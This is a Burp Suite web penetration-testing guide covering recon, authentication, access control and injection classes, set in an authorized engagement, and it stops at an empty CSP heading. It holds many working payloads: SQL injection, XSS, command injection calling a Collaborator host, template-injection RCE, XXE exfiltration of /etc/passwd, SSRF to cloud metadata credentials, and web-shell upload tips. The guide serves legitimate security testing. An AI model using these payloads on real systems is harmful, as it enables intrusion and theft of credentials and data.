# Web Application Penetration Testing Guide — Burp Suite

> A comprehensive, methodology-driven checklist for web application penetration testing using Burp Suite Professional. Organized by attack category with step-by-step Burp workflows, payloads, and remediation notes.

---

## Table of Contents

1. [Pre-Engagement & Scope Setup](#1-pre-engagement--scope-setup)
2. [Reconnaissance & Information Gathering](#2-reconnaissance--information-gathering)
3. [Authentication Testing](#3-authentication-testing)
4. [Session Management Testing](#4-session-management-testing)
5. [Authorization & Access Control Testing](#5-authorization--access-control-testing)
6. [Input Validation — SQL Injection](#6-input-validation--sql-injection)
7. [Input Validation — Cross-Site Scripting (XSS)](#7-input-validation--cross-site-scripting-xss)
8. [Input Validation — Command Injection](#8-input-validation--command-injection)
9. [Input Validation — Server-Side Template Injection (SSTI)](#9-input-validation--server-side-template-injection-ssti)
10. [Input Validation — XML External Entity (XXE)](#10-input-validation--xml-external-entity-xxe)
11. [Input Validation — LDAP Injection](#11-input-validation--ldap-injection)
12. [Input Validation — Path Traversal & Local File Inclusion (LFI)](#12-input-validation--path-traversal--local-file-inclusion-lfi)
13. [Input Validation — Remote File Inclusion (RFI)](#13-input-validation--remote-file-inclusion-rfi)
14. [Input Validation — Server-Side Request Forgery (SSRF)](#14-input-validation--server-side-request-forgery-ssrf)
15. [Input Validation — HTTP Parameter Pollution](#15-input-validation--http-parameter-pollution)
16. [Input Validation — Insecure Deserialization](#16-input-validation--insecure-deserialization)
17. [Cross-Site Request Forgery (CSRF)](#17-cross-site-request-forgery-csrf)
18. [File Upload Testing](#18-file-upload-testing)
19. [Business Logic Testing](#19-business-logic-testing)
20. [API & Web Service Testing](#20-api--web-service-testing)
21. [WebSocket Testing](#21-websocket-testing)
22. [Client-Side Testing](#22-client-side-testing)
23. [HTTP Security Headers & Transport Security](#23-http-security-headers--transport-security)
24. [Error Handling & Information Disclosure](#24-error-handling--information-disclosure)
25. [Cryptography Testing](#25-cryptography-testing)
26. [Rate Limiting & Denial of Service](#26-rate-limiting--denial-of-service)
27. [CORS Misconfiguration](#27-cors-misconfiguration)
28. [HTTP Request Smuggling](#28-http-request-smuggling)
29. [Cache Poisoning](#29-cache-poisoning)
30. [Reporting & Cleanup](#30-reporting--cleanup)

---

## 1. Pre-Engagement & Scope Setup

### 1.1 Define Scope

- Confirm in-scope domains, subdomains, IP ranges, and URL paths.
- Identify out-of-scope targets (third-party services, payment gateways, production databases).
- Get written Rules of Engagement (RoE) signed.

### 1.2 Burp Suite Project Configuration

| Step | Action |
|------|--------|
| 1 | **Create a new Burp project** → save to disk for persistence. |
| 2 | **Target → Scope settings** → add all in-scope URLs/domains. Check "Use advanced scope control" for granular path/port filtering. |
| 3 | Enable **"Don't send items to Proxy history which are out of scope"** to reduce noise. |
| 4 | Configure **upstream proxy** if testing through a corporate proxy. |
| 5 | Install the **Burp CA certificate** in your browser to intercept HTTPS. |
| 6 | Configure **session handling rules** under Project Options → Sessions if the app requires token refresh or re-authentication. |
| 7 | Set **resource pool** limits to avoid overwhelming the application. |

### 1.3 Recommended Burp Extensions

| Extension | Purpose |
|-----------|---------|
| **Autorize** | Automated authorization testing |
| **Logger++** | Enhanced request/response logging |
| **Param Miner** | Hidden parameter discovery |
| **Turbo Intruder** | High-speed brute-force and race conditions |
| **Hackvertor** | Encoding/decoding for payload crafting |
| **Active Scan++** | Additional active scan checks |
| **J2EEScan** | Java-specific vulnerability checks |
| **JSON Web Tokens (JWT Editor)** | JWT manipulation and attack |
| **Collaborator Everywhere** | Inject Collaborator payloads into all requests |
| **Software Vulnerability Scanner** | Map technologies to known CVEs |
| **Backslash Powered Scanner** | Advanced injection detection |
| **HTTP Request Smuggler** | Automated smuggling detection |
| **InQL** | GraphQL introspection and injection |

---

## 2. Reconnaissance & Information Gathering

### 2.1 Passive Reconnaissance (Proxy History)

1. **Browse the entire application** manually with Burp Proxy intercepting.
2. Walk through every feature: registration, login, profile, search, file upload, admin panels, password reset, etc.
3. Review **Proxy → HTTP history** for:
   - All endpoints and parameters discovered.
   - Hidden form fields, AJAX calls, API endpoints.
   - Cookies and tokens being set.
   - Response headers revealing server/framework versions.

### 2.2 Spider / Crawl

1. **Target → Site map** → right-click the root → "Scan" or "Spider this host."
2. Configure the crawler:
   - Set max crawl depth (recommended: 8–12).
   - Configure login credentials if crawling behind authentication.
   - Set form submission behavior (auto-submit or prompt).
3. Review the site map tree for discovered directories, files, and parameters.

### 2.3 Content Discovery

1. **Engagement tools → Discover content**:
   - Use built-in wordlists or custom wordlists (SecLists `raft-large-directories.txt`, `raft-large-files.txt`).
   - Configure file extensions: `.php`, `.asp`, `.aspx`, `.jsp`, `.json`, `.xml`, `.bak`, `.old`, `.config`, `.env`, `.git`, `.svn`.
2. Look for:
   - `/robots.txt`, `/sitemap.xml`, `/.well-known/`, `/crossdomain.xml`
   - Backup files: `web.config.bak`, `config.php.old`, `.env`
   - Admin panels: `/admin`, `/administrator`, `/management`, `/wp-admin`
   - Debug endpoints: `/debug`, `/trace`, `/elmah.axd`, `/phpinfo.php`
   - Version control exposure: `/.git/HEAD`, `/.svn/entries`

### 2.4 Technology Fingerprinting

- Review **Server**, **X-Powered-By**, **X-AspNet-Version** response headers.
- Examine default error pages for framework signatures.
- Check JavaScript libraries and versions in the page source.
- Note CMS indicators (WordPress, Drupal, Joomla meta tags).
- Use the Burp extension **Software Vulnerability Scanner** to map technologies to CVEs.

---

## 3. Authentication Testing

### 3.1 Credential Brute-Force

| Step | Burp Action |
|------|-------------|
| 1 | Capture a login POST request in Proxy. |
| 2 | Send to **Intruder**. |
| 3 | Set attack type to **Cluster Bomb** (username + password). |
| 4 | Load username wordlist (e.g., `top-usernames-shortlist.txt`). |
| 5 | Load password wordlist (e.g., `rockyou-top-10000.txt`). |
| 6 | Configure **Grep – Match** for success indicators (e.g., "Welcome", "Dashboard", 302 redirect). |
| 7 | Configure **Grep – Extract** for error messages to identify user enumeration. |
| 8 | Monitor for **account lockout** — note the threshold. |

### 3.2 Username Enumeration

- **Different error messages**: "Invalid username" vs "Invalid password."
- **Response timing differences**: Send to Intruder, monitor response times.
- **Response length differences**: Sorted by length in Intruder results.
- **Registration/password-reset oracle**: Try registering known usernames.
- Check forgot-password responses for enumeration.

### 3.3 Password Policy Testing

- Test minimum length, complexity requirements.
- Attempt common passwords: `password`, `123456`, `Password1!`.
- Check if previously breached passwords are blocked.

### 3.4 Default Credentials

Test for known default credentials:

```
admin:admin
admin:password
administrator:administrator
test:test
root:root
guest:guest
```

### 3.5 Multi-Factor Authentication (MFA) Bypass

- Test if MFA can be skipped by directly navigating to post-auth pages.
- Check if the MFA token is predictable or brute-forceable (4-6 digit codes via Intruder).
- Test if MFA is enforced on all login paths (API, mobile, alternate endpoints).
- Check if the MFA "remember me" token can be reused or forged.

### 3.6 Password Reset Mechanism

| Test | Method |
|------|--------|
| Token predictability | Generate multiple reset tokens → analyze in Sequencer. |
| Token reuse | Use a reset link after the password is changed. |
| Token expiration | Use a reset link after a long delay. |
| Host header injection | Modify `Host:` header to attacker-controlled domain in Repeater. |
| Parameter manipulation | Change email/username parameter to a victim's. |

### 3.7 "Remember Me" Functionality

- Decode the "remember me" cookie/token — check for encoded credentials.
- Test if the token changes between sessions.
- Test if the token is invalidated on password change.

---

## 4. Session Management Testing

### 4.1 Session Token Analysis

1. Capture 200+ session tokens via Burp **Sequencer**:
   - Right-click a response that sets the session cookie → "Send to Sequencer."
   - Define the token location (cookie name or header).
   - Click "Start live capture."
2. Analyze results:
   - **Character-level analysis** — entropy should be high (>100 bits effective).
   - **Bit-level analysis** — look for predictable patterns.
   - Significance level should be well within bounds.

### 4.2 Session Fixation

1. Obtain a pre-authentication session token.
2. Authenticate with valid credentials.
3. Compare the post-authentication token with the pre-authentication token.
4. **Vulnerability**: Token does NOT change after login.

### 4.3 Session Invalidation

| Test | Steps |
|------|-------|
| Logout invalidation | Log out → replay the old session cookie in Repeater. |
| Timeout | Wait for the configured idle timeout → replay the token. |
| Concurrent sessions | Log in from two browsers → log out of one → test the other. |
| Password change | Change password → test the old session from another browser. |

### 4.4 Cookie Attributes

Inspect the `Set-Cookie` header for:

| Attribute | Expected | Risk if Missing |
|-----------|----------|-----------------|
| `Secure` | Present | Cookie sent over HTTP (sniffing). |
| `HttpOnly` | Present | Cookie accessible via JavaScript (XSS theft). |
| `SameSite` | `Strict` or `Lax` | CSRF vulnerability. |
| `Path` | Restrictive | Broader cookie scope than necessary. |
| `Domain` | Specific | Cookie shared across subdomains. |
| `Expires/Max-Age` | Reasonable | Persistent sessions. |

### 4.5 Session Hijacking via Token in URL

- Check if session tokens appear in:
  - URL parameters (visible in logs, Referer headers).
  - Browser history.
  - Cached pages.

---

## 5. Authorization & Access Control Testing

### 5.1 Horizontal Privilege Escalation

1. Create two accounts at the same privilege level (User A, User B).
2. Log in as User A → browse to a resource owned by User A (e.g., `/profile?id=123`).
3. In **Repeater**, change the identifier to User B's resource (e.g., `/profile?id=124`).
4. Check if User A can access User B's data.

### 5.2 Vertical Privilege Escalation

1. Log in as a low-privilege user.
2. Identify admin-only endpoints from recon (e.g., `/admin/users`, `/api/v1/admin/settings`).
3. In **Repeater**, request those endpoints with the low-privilege session token.
4. Check for 200 OK responses with admin content.

### 5.3 Insecure Direct Object References (IDOR)

- Test all parameters that reference objects: `id`, `uid`, `orderId`, `documentId`, `fileId`.
- Iterate through numeric IDs, GUIDs, or encoded values.
- Test both GET and POST/PUT/DELETE operations.
- Check API endpoints for mass IDOR with Intruder (sequential IDs).

### 5.4 Autorize Extension (Automated)

1. Install the **Autorize** extension.
2. Configure:
   - Set the "low-privilege" session cookie.
   - Optionally set an "unauthenticated" state.
3. Browse the application as a high-privilege user.
4. Autorize automatically replays every request with the low-privilege token.
5. Review the results table:
   - **Red** = Authorized (potential vuln — low-priv got the same response).
   - **Green** = Enforced (access denied as expected).

### 5.5 Forced Browsing

- Access resources directly by URL without going through the normal workflow.
- Test accessing other users' files: `/uploads/user123/document.pdf` → try `/uploads/user124/document.pdf`.
- Access API endpoints not linked in the UI.

### 5.6 HTTP Method Testing

- If `GET /admin/users` is blocked, try:
  - `POST /admin/users`
  - `PUT /admin/users`
  - `OPTIONS /admin/users`
  - `HEAD /admin/users`
  - Custom methods: `JEFF /admin/users`

---

## 6. Input Validation — SQL Injection

### 6.1 Detection

1. Identify all input points: URL parameters, POST body, cookies, headers (`User-Agent`, `Referer`, `X-Forwarded-For`).
2. Inject diagnostic payloads in **Repeater**:

```sql
'
"
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
1' ORDER BY 1--
1' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--
' AND 1=1--
' AND 1=2--
```

3. Observe:
   - SQL error messages (syntax errors, ODBC errors).
   - Behavioral differences (true vs false condition).
   - Time delays (blind SQLi).
   - Application crashes.

### 6.2 Automated Scanning

1. Right-click the request → **"Do active scan"** → Burp Scanner will test for SQLi.
2. Review **Issues** panel for SQL injection findings.
3. Use the **Backslash Powered Scanner** extension for edge cases.

### 6.3 Manual Exploitation with Repeater

#### Error-Based (MySQL Example)

```sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1)--
```

#### Union-Based

```sql
-- Step 1: Determine column count
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   (increment until error)

-- Step 2: Find displayable columns
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--

-- Step 3: Extract data
' UNION SELECT username, password, NULL FROM users--
```

#### Blind Boolean-Based

```sql
' AND SUBSTRING((SELECT database()),1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--
```

#### Blind Time-Based

```sql
-- MySQL
' AND SLEEP(5)--
-- MSSQL
'; WAITFOR DELAY '0:0:5'--
-- PostgreSQL
'; SELECT pg_sleep(5)--
-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

#### Out-of-Band (OOB)

```sql
-- MSSQL
'; EXEC master..xp_dirtree '\\BURP-COLLABORATOR-SUBDOMAIN\share'--
-- MySQL
' UNION SELECT LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\share')--
```

Use Burp Collaborator to detect OOB callbacks.

### 6.4 Second-Order SQL Injection

- Inject payload into a stored field (e.g., username during registration).
- Trigger the payload through a different feature (e.g., viewing user list).
- Monitor for errors or data leakage when the stored value is used in a query.

### 6.5 SQLi in Non-Standard Locations

- **JSON bodies**: `{"search": "' OR 1=1--"}`
- **XML bodies**: `<query>' OR 1=1--</query>`
- **HTTP headers**: `Cookie`, `X-Forwarded-For`, `Referer`, `User-Agent`
- **Order-by parameters**: `sort=name` → `sort=name;WAITFOR DELAY '0:0:5'`

---

## 7. Input Validation — Cross-Site Scripting (XSS)

### 7.1 Reflected XSS

1. Identify all reflection points — parameters reflected in the response body.
2. Inject test payloads in **Repeater**:

```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
" onfocus=alert(1) autofocus="
'-alert(1)-'
</script><script>alert(1)</script>
```

3. Analyze the response:
   - Is the payload rendered unescaped in HTML?
   - Is it inside an HTML attribute, JavaScript block, or URL context?
   - What characters are filtered or encoded?

### 7.2 Stored XSS

1. Identify all stored input fields: comments, profiles, messages, file names, metadata.
2. Submit XSS payloads into each field.
3. Navigate to the page where the stored content is displayed.
4. Check if the payload executes.

### 7.3 DOM-Based XSS

1. Review JavaScript source code for dangerous sinks:

```javascript
document.write()
innerHTML
outerHTML
eval()
setTimeout() / setInterval() with string arguments
location.href / location.assign() / location.replace()
$.html()
```

2. Trace data flow from sources (`location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`) to sinks.
3. Test with payloads in URL fragments: `#<img src=x onerror=alert(1)>`

### 7.4 Context-Specific Payloads

| Context | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute (double-quoted) | `" onmouseover="alert(1)` |
| HTML attribute (single-quoted) | `' onmouseover='alert(1)` |
| JavaScript string (single-quoted) | `'-alert(1)-'` |
| JavaScript string (double-quoted) | `"-alert(1)-"` |
| JavaScript template literal | `${alert(1)}` |
| URL / `href` attribute | `javascript:alert(1)` |
| Inside `<script>` block | `</script><script>alert(1)</script>` |
| CSS context | `expression(alert(1))` or `url(javascript:alert(1))` |

### 7.5 Filter Bypass Techniques

```html
<ScRiPt>alert(1)</ScRiPt>                     <!-- Case variation -->
<scr<script>ipt>alert(1)</scr</script>ipt>    <!-- Nested tags -->
<img src=x onerror=alert&#40;1&#41;>           <!-- HTML entities -->
<img src=x onerror=\u0061lert(1)>              <!-- Unicode escapes -->
<svg/onload=alert(1)>                          <!-- No space needed -->
<details open ontoggle=alert(1)>               <!-- Less common events -->
<iframe srcdoc="<script>alert(1)</script>">    <!-- srcdoc injection -->
```

Use **Hackvertor** extension to automate encoding transformations.

### 7.6 XSS via File Upload

- Upload an HTML file or SVG containing JavaScript.
- Access the uploaded file URL to see if it executes.

---

## 8. Input Validation — Command Injection

### 8.1 Detection

Identify functionality that may invoke system commands (ping, traceroute, DNS lookup, file conversion, PDF generation, etc.).

```bash
; id
| id
|| id
& id
&& id
$(id)
`id`
%0a id
\n id
```

### 8.2 Blind Command Injection

```bash
; sleep 10
| sleep 10
& ping -c 10 127.0.0.1 &
; curl http://BURP-COLLABORATOR-SUBDOMAIN
; nslookup BURP-COLLABORATOR-SUBDOMAIN
```

Use Burp Collaborator to detect OOB callbacks.

### 8.3 Burp Workflow

1. Send suspicious request to **Repeater**.
2. Inject payloads into each parameter.
3. For blind injection, use **Collaborator Everywhere** or manual Collaborator payloads.
4. For time-based, measure response times with Intruder.

---

## 9. Input Validation — Server-Side Template Injection (SSTI)

### 9.1 Detection

Inject mathematical expressions to see if they are evaluated:

```
{{7*7}}          → 49 (Jinja2, Twig)
${7*7}           → 49 (Freemarker, Mako)
<%= 7*7 %>       → 49 (ERB)
#{7*7}           → 49 (Pebble, Thymeleaf)
{{7*'7'}}        → 7777777 (Jinja2 — string multiplication confirms template engine)
${7*'7'}         → Error or 49 (Freemarker)
```

### 9.2 Exploitation

#### Jinja2 (Python)

```python
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

#### Freemarker (Java)

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

#### Twig (PHP)

```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### 9.3 Burp Workflow

1. Fuzz parameters with the polyglot: `${{<%[%'"}}%\`
2. Observe which characters cause errors or are evaluated.
3. Use the decision tree to identify the template engine.
4. Escalate to RCE using engine-specific payloads in Repeater.

---

## 10. Input Validation — XML External Entity (XXE)

### 10.1 Detection

Look for endpoints accepting XML input (Content-Type: `application/xml`, `text/xml`, SOAP services).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 10.2 Blind XXE with Collaborator

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">
]>
<root>&xxe;</root>
```

### 10.3 XXE via Parameter Entities

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN">
  %xxe;
]>
<root>test</root>
```

### 10.4 XXE OOB Data Exfiltration

Host a malicious DTD on your server:

```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?data=%file;'>">
%eval;
%exfil;
```

Then inject:

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR-SERVER/evil.dtd">
  %xxe;
]>
```

### 10.5 XXE in Non-Obvious Locations

- **File uploads** accepting DOCX, XLSX, SVG (they are XML-based ZIP archives).
- **SOAP requests**.
- **Content-Type switching**: Change `application/json` to `application/xml` and send XML body.
- **RSS/Atom feeds**.

---

## 11. Input Validation — LDAP Injection

### 11.1 Detection

Target login forms or search functionality backed by LDAP.

```
*
*)(&
*)(|(&
admin)(|(password=*))
```

### 11.2 Authentication Bypass

```
admin)(&)
admin)(|(password=*
*)(uid=*))(|(uid=*
```

### 11.3 Burp Workflow

1. Intercept login or search requests in Proxy.
2. Send to Repeater and inject LDAP metacharacters.
3. Observe differences in response (authenticated vs. not, data returned vs. not).

---

## 12. Input Validation — Path Traversal & Local File Inclusion (LFI)

### 12.1 Detection

Target parameters that reference files: `file=`, `path=`, `page=`, `template=`, `include=`, `doc=`, `img=`.

```
../../../etc/passwd
..\..\..\..\windows\system32\drivers\etc\hosts
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%00/etc/passwd
```

### 12.2 Windows Targets

```
..\..\..\windows\win.ini
..\..\..\windows\system32\config\sam
```

### 12.3 LFI to RCE

| Technique | Details |
|-----------|---------|
| Log poisoning | Inject PHP into User-Agent → include access log. |
| PHP wrappers | `php://filter/convert.base64-encode/resource=config.php` |
| `/proc/self/environ` | Include environment variables containing injected headers. |
| PHP session files | Inject into session → include `/tmp/sess_SESSIONID`. |

### 12.4 Burp Workflow

1. Identify file-referencing parameters.
2. Send to **Intruder** with a path traversal wordlist (SecLists `LFI-Jhaddix.txt`).
3. Grep results for known file content (`root:x:0:0`, `[boot loader]`).

---

## 13. Input Validation — Remote File Inclusion (RFI)

### 13.1 Detection

```
http://BURP-COLLABORATOR-SUBDOMAIN/evil.txt
//BURP-COLLABORATOR-SUBDOMAIN/evil.txt
```

### 13.2 Burp Workflow

1. In Repeater, replace the file parameter with a Collaborator URL.
2. Check Collaborator for incoming HTTP/DNS requests.
3. If confirmed, host a PHP shell on your server and include it.

---

## 14. Input Validation — Server-Side Request Forgery (SSRF)

### 14.1 Detection

Target parameters that accept URLs: `url=`, `redirect=`, `link=`, `src=`, `callback=`, `webhook=`, `api=`.

```
http://BURP-COLLABORATOR-SUBDOMAIN
http://127.0.0.1
http://localhost
http://169.254.169.254/latest/meta-data/    (AWS metadata)
http://[::1]
http://0.0.0.0
http://2130706433                            (decimal IP for 127.0.0.1)
http://0x7f000001                            (hex IP for 127.0.0.1)
http://127.1
```

### 14.2 Cloud Metadata Endpoints

| Cloud Provider | Metadata URL |
|---------------|-------------|
| AWS | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` (requires header `Metadata-Flavor: Google`) |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires header `Metadata: true`) |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` |

### 14.3 Bypass Techniques

```
http://127.0.0.1.nip.io
http://spoofed.burpcollaborator.net (DNS rebinding)
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

### 14.4 Burp Workflow

1. Inject Collaborator URLs into every URL-type parameter via Repeater.
2. Use **Collaborator Everywhere** to inject into headers automatically.
3. Monitor Collaborator for DNS/HTTP callbacks.

---

## 15. Input Validation — HTTP Parameter Pollution

### 15.1 Testing

Send duplicate parameters and observe which value the application uses:

```
?id=1&id=2
```

| Technology | Behavior |
|-----------|----------|
| ASP.NET | Concatenates: `id=1,2` |
| PHP | Uses last: `id=2` |
| Python/Flask | Uses first: `id=1` |
| Java/Tomcat | Uses first: `id=1` |

### 15.2 Exploitation Scenarios

- Bypass WAF rules by splitting payloads across duplicate parameters.
- Override server-side parameters (e.g., `price=1&price=0`).
- Manipulate OAuth flows by injecting extra `redirect_uri` parameters.

---

## 16. Input Validation — Insecure Deserialization

### 16.1 Detection

- Look for serialized data in cookies, hidden fields, API parameters.
- **Java**: Base64-decoded data starting with `ac ed 00 05` or `rO0AB`.
- **PHP**: Strings like `O:4:"User":2:{s:4:"name";s:5:"admin";}`.
- **.NET**: `VIEWSTATE` parameters, `ObjectStateFormatter`.
- **Python**: Pickle data, YAML with `!!python/object`.

### 16.2 Burp Workflow

1. Identify serialized blobs in Proxy history.
2. Decode and modify in **Decoder** or using **Hackvertor**.
3. For Java, use `ysoserial` to generate payloads and paste into Repeater.
4. For .NET VIEWSTATE, check if MAC validation is disabled.
5. Monitor Collaborator for OOB callbacks from deserialization payloads.

---

## 17. Cross-Site Request Forgery (CSRF)

### 17.1 Detection

1. Identify state-changing requests (password change, email change, transfer funds, delete account).
2. In **Repeater**, examine:
   - Is there a CSRF token? Remove it and replay.
   - Is the CSRF token validated? Change it to a random value and replay.
   - Is the token tied to the session? Swap tokens between users.
   - Is `SameSite` cookie attribute set?

### 17.2 Generate CSRF PoC

1. Right-click the request in Proxy → **Engagement tools → Generate CSRF PoC**.
2. Burp generates an HTML form that auto-submits.
3. Modify the PoC if needed and test in the browser.

### 17.3 Bypass Techniques

- Remove the token parameter entirely.
- Change POST to GET (some apps don't validate CSRF on GET).
- Use a token from a different session.
- Check if the app only validates the token if it's present (remove the field entirely).
- Test with `Content-Type: text/plain` (avoids preflight in CORS).

---

## 18. File Upload Testing

### 18.1 Test Matrix

| Test | Payload |
|------|---------|
| Extension bypass | `shell.php.jpg`, `shell.php%00.jpg`, `shell.pHp`, `shell.php5` |
| Content-Type bypass | Change `Content-Type` to `image/jpeg` while uploading `.php`. |
| Magic bytes | Prepend file with `GIF89a;` and use `.php` extension. |
| Double extension | `shell.jpg.php` |
| Null byte | `shell.php%00.jpg` (legacy systems). |
| SVG with XSS | `<svg><script>alert(1)</script></svg>` |
| Polyglot files | JPEG/PHP polyglot that is valid as both. |
| Zip slip | Path traversal in archive filenames: `../../etc/cron.d/shell`. |
| Large files | Test upload size limits (DoS). |
| Filename injection | `; id`, `$(id)`, `| id` in filename. |

### 18.2 Burp Workflow

1. Intercept the upload request in Proxy.
2. Modify the file content, extension, and Content-Type in Repeater.
3. Note the upload path from the response.
4. Access the uploaded file to check if it executes.

---

## 19. Business Logic Testing

### 19.1 Common Business Logic Flaws

| Category | Test |
|----------|------|
| Price manipulation | Intercept purchase request → change price to 0 or negative. |
| Quantity manipulation | Set quantity to -1 → check for refund/credit. |
| Coupon/discount abuse | Apply coupon multiple times; use expired coupons. |
| Workflow bypass | Skip steps in multi-step processes (e.g., go from cart to confirmation, skipping payment). |
| Race conditions | Use **Turbo Intruder** to send parallel requests (e.g., redeem a coupon twice simultaneously). |
| Feature abuse | Transfer more money than account balance; vote multiple times. |
| Role manipulation | Change `role=user` to `role=admin` in request body. |
| Referral abuse | Self-referral, cyclical referrals. |
| Free trial abuse | Re-register with same details after trial expires. |

### 19.2 Race Condition Testing with Turbo Intruder

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput)

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
```

1. Send the request to Turbo Intruder.
2. Use the `race-single-packet-attack.py` template for true simultaneous delivery.
3. Check if the action was applied multiple times.

---

## 20. API & Web Service Testing

### 20.1 REST API Testing

| Test | Method |
|------|--------|
| Enumerate endpoints | Review JS files, API docs (`/swagger.json`, `/openapi.json`, `/api-docs`). |
| HTTP method fuzzing | Test GET, POST, PUT, PATCH, DELETE on every endpoint. |
| Parameter tampering | Modify IDs, add extra fields (`"isAdmin": true`). |
| Mass assignment | Add unexpected fields in POST/PUT: `{"name":"test","role":"admin"}`. |
| API versioning | Try `/api/v1/` vs `/api/v2/` — older versions may lack security. |
| Pagination abuse | `?limit=999999` or negative offsets. |
| GraphQL | Use **InQL** extension for introspection and injection. |

### 20.2 GraphQL Testing

```graphql
# Introspection query
{__schema{types{name,fields{name,args{name}}}}}

# SQL injection in arguments
{ user(id: "1' OR '1'='1") { name email } }

# Nested query DoS
{ user { friends { friends { friends { name } } } } }

# Batch query attack
[{"query":"{ user(id:1) { password } }"},{"query":"{ user(id:2) { password } }"}]
```

### 20.3 SOAP/XML Web Services

1. Find WSDL files: `?wsdl`, `?WSDL`.
2. Parse the WSDL to understand operations and parameters.
3. Test XXE in SOAP envelopes.
4. Test SQLi in SOAP parameters.
5. Use **WSDLer** extension to auto-generate requests.

---

## 21. WebSocket Testing

### 21.1 Burp WebSocket Support

1. **Proxy → WebSockets history** — view all WebSocket messages.
2. Intercept WebSocket messages by enabling interception for WebSockets.
3. Modify messages in real-time.

### 21.2 Testing Areas

| Test | Description |
|------|-------------|
| Authentication | Are WebSocket connections authenticated? |
| Authorization | Can you access other users' channels? |
| Input validation | Inject XSS, SQLi payloads in WebSocket messages. |
| Origin validation | Modify `Origin` header — is it validated? |
| Rate limiting | Send rapid messages — is there a limit? |
| Message tampering | Modify message content (amounts, recipient, etc.). |

### 21.3 Cross-Site WebSocket Hijacking

1. Check if the WebSocket handshake relies only on cookies (no CSRF token).
2. Create a malicious HTML page that initiates a WebSocket connection to the target.
3. If the browser sends session cookies automatically, the attacker can hijack the session.

---

## 22. Client-Side Testing

### 22.1 JavaScript Analysis

1. **Target → Site map** → review all JavaScript files.
2. Search JS files for:
   - API keys and secrets: `apiKey`, `secret`, `token`, `password`.
   - Hidden endpoints and admin functionality.
   - Debug or development code.
   - Client-side validation that can be bypassed.
   - `postMessage` handlers without origin checks.

### 22.2 Sensitive Data in Client-Side Storage

Check using browser Developer Tools or Burp:
- `localStorage`
- `sessionStorage`
- IndexedDB
- Cookies without `HttpOnly`

### 22.3 Clickjacking

1. Check for `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers.
2. If absent, create a PoC:

```html
<html>
<head><title>Clickjacking PoC</title></head>
<body>
<h1>Click the button below!</h1>
<iframe src="https://TARGET-URL/sensitive-action"
        style="opacity: 0.1; position: absolute; top: 0; left: 0;
               width: 100%; height: 100%; z-index: 2;">
</iframe>
<button style="position: relative; z-index: 1;">Click Me!</button>
</body>
</html>
```

### 22.4 Open Redirect

Test redirect parameters: `redirect=`, `url=`, `next=`, `return=`, `goto=`, `dest=`.

```
https://evil.com
//evil.com
/\evil.com
/%0d%0aLocation:%20http://evil.com
```

### 22.5 postMessage Vulnerabilities

1. Find `window.addEventListener('message', ...)` handlers in JavaScript.
2. Check if the origin is validated: `if (event.origin !== 'https://trusted.com')`.
3. If no validation, craft a page that sends malicious messages:

```javascript
targetWindow.postMessage('{"action":"delete","id":"*"}', '*');
```

---

## 23. HTTP Security Headers & Transport Security

### 23.1 Header Checklist

Review response headers in Proxy or Repeater:

| Header | Expected Value | Impact if Missing/Misconfigured |
|--------|---------------|-------------------------------|
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains; preload` | MITM via SSL stripping. |
| `Content-Security-Policy` | Restrictive policy | XSS, data injection. |
| `X-Content-Type-Options` | `nosniff` | MIME-type confusion attacks. |
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` | Clickjacking. |
| `Referrer-Policy` | `strict-origin-when-cross-origin` or `no-referrer` | Information leakage. |
| `Permissions-Policy` | Restrictive | Unauthorized feature access (camera, mic, geolocation). |
| `X-XSS-Protection` | `0` (rely on CSP instead) | Deprecated but check. |
| `Cache-Control` | `no-store` for sensitive pages | Cached sensitive data. |

### 23.2 TLS/SSL Testing

- Verify TLS 1.2+ only (no SSLv3, TLS 1.0, TLS 1.1).
- Check for weak cipher suites.
- Verify certificate validity and chain.
- Test for HSTS header on all responses.
- Check for mixed content (HTTP resources on HTTPS pages).

### 23.3 Content Security Policy (CSP) Analysis

